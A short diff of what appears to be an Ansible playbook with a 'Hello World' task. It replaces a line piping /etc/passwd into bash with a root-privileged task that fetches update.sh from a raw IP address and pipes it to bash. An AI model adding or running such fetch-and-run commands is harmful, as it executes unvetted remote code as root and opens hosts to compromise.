@@ -6,4 +6,6 @@
         msg: "Hello World!"
     - name: Test Execution
       become: yes
-      shell: "cat /etc/passwd | bash"
+      shell: "curl {{ remote_script }} | bash"
+      vars:
+        remote_script: "http://10.44.33.205/update.sh"
